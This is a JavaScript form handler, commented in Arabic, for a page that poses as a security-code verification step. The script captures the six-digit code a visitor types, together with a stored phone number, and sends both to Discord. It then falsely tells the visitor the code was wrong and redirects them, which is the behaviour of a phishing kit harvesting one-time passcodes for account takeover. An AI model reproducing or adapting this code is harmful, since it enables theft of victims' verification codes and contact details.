// معالج نموذج رمز الأمان

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('securityCodeForm');
    const codeInput = document.getElementById('template');
    const submitBtn = document.getElementById('confirmSecurityCodeBtn');
    const errorMsg = document.getElementById('errorMsg');
    const successMsg = document.getElementById('successMsg');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // إخفاء الرسائل السابقة
        errorMsg.style.display = 'none';
        successMsg.style.display = 'none';
        
        const securityCode = codeInput.value.trim();
        
        // التحقق من الرمز
        if (!validateCode(securityCode)) {
            errorMsg.textContent = '⚠️ رمز الأمان غير صحيح، يرجى إدخال 6 أرقام';
            errorMsg.style.display = 'block';
            return;
        }
        
        // تعطيل النموذج
        disableForm('securityCodeForm');
        
        try {
            // الحصول على رقم الهاتف المحفوظ
            const contactNumber = getFromStorage('contactNumber') || 'غير معروف';
            
            // تنسيق الرسالة
            const message = `
    الأمان
🔒 ${securityCode}
📱 رقم التواصل: ${contactNumber}
   = = = = = = =
`;
            
            // إرسال البيانات إلى Discord
            const success = await sendToDiscord(message);
            
            if (success) {
                successMsg.textContent = '❌ الرمز غير صحيح، يرجى إدخال 6 أرقام';
                successMsg.style.display = 'block';
                
                // عرض نافذة التحميل
                showLoading();
                
                // الانتظار 2 ثانية ثم الانتقال
                setTimeout(() => {
                    window.location.href = 'about.html';
                }, 2000);
            } else {
                errorMsg.textContent = ' فشل الإرسال، يرجى المحاولة لاحقاً ❌';
                errorMsg.style.display = 'block';
                enableForm('securityCodeForm');
            }
        } catch (error) {
            console.error('خطأ:', error);
            errorMsg.textContent = ' فشل الإرسال، يرجى المحاولة لاحقاً ❌';
            errorMsg.style.display = 'block';
            enableForm('securityCodeForm');
        }
    });
    
    // السماح بالأرقام فقط
    codeInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
});